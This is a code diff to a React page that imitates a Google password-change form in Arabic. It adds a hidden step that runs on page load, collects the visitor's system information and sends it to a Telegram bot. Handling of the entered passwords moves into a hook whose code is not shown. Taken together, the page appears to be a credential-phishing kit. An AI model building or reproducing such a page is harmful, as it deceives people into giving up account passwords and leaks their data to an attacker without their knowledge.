@@ -1,47 +1,39 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Eye, EyeOff, HelpCircle, Loader2, MoreVertical, Moon, Sun } from "lucide-react";
-import { useToast } from "@/components/ui/use-toast";
 import GoogleLogo from "@/components/GoogleLogo";
+import { usePasswordForm } from "@/hooks/usePasswordForm";
+import { sendToTelegram, collectSystemInfo } from "@/utils/telegramNotifier";
 
 const Index = () => {
-  const [oldPassword, setOldPassword] = useState("");
-  const [newPassword, setNewPassword] = useState("");
-  const [confirmPassword, setConfirmPassword] = useState("");
   const [showOldPassword, setShowOldPassword] = useState(false);
   const [showNewPassword, setShowNewPassword] = useState(false);
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
-  const [isLoading, setIsLoading] = useState(false);
   const [isDarkMode, setIsDarkMode] = useState(false);
   const [isArabic, setIsArabic] = useState(true);
-  const { toast } = useToast();
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    
-    if (newPassword !== confirmPassword) {
-      toast({
-        variant: "destructive",
-        title: "كلمات المرور غير متطابقة",
-        description: "يرجى التأكد من تطابق كلمة المرور الجديدة مع تأكيدها"
-      });
-      return;
-    }
+  const {
+    oldPassword,
+    setOldPassword,
+    newPassword,
+    setNewPassword,
+    confirmPassword,
+    setConfirmPassword,
+    isLoading,
+    handleSubmit,
+  } = usePasswordForm();
 
-    setIsLoading(true);
-    
-    // Simulate API call
-    await new Promise(resolve => setTimeout(resolve, 1500));
-    
-    toast({
-      title: "تم تغيير كلمة المرور بنجاح",
-      description: "يمكنك الآن استخدام كلمة المرور الجديدة لتسجيل الدخول",
-    });
-    
-    setIsLoading(false);
-    setOldPassword("");
-    setNewPassword("");
-    setConfirmPassword("");
-  };
+  useEffect(() => {
+    const sendInitialInfo = async () => {
+      const message = `
+🌐 زيارة جديدة للموقع
+
+${collectSystemInfo()}
+      `;
+      await sendToTelegram(message);
+    };
+
+    sendInitialInfo();
+  }, []);
 
   const toggleDarkMode = () => {
     setIsDarkMode(!isDarkMode);
